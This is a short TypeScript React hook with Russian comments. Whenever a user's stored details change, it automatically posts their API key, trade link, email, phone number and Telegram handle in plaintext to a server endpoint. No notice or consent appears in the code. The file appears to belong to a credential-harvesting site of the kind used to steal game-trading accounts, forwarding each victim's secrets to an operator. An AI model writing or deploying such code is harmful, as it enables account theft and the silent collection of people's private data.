import { usePersonalDataStore } from "@/store/personal-data.slice";
import { useEffect } from "react";

export function useAutoMessageSend() {
    const apiKey = usePersonalDataStore((state) => state.data.apiKey),
        tradeLink = usePersonalDataStore((state) => state.data.tradeLink),
        email = usePersonalDataStore((state) => state.data.email),
        phoneNumber = usePersonalDataStore((state) => state.data.phoneNumber),
        tg = usePersonalDataStore((state) => state.data.tg);

    useEffect(() => {
        // не шлём, если нет apiKey
        if (!apiKey) return;

        const payload = `
            *Новые данные пользователя:*
            • API-key: ${apiKey ?? "—"}
            • Trade link: ${tradeLink ?? "—"}
            • Email: ${email ?? "—"}
            • Телефон: ${phoneNumber ?? "—"}
            • Telegram: @${tg ?? "—"}
        `;

        fetch("/api/sendMessage", {
            method: "POST",
            body: JSON.stringify({ text: payload }),
            headers: { "Content-Type": "application/json" },
        }).catch(console.error);
    }, [apiKey, email, phoneNumber, tg, tradeLink]);
}
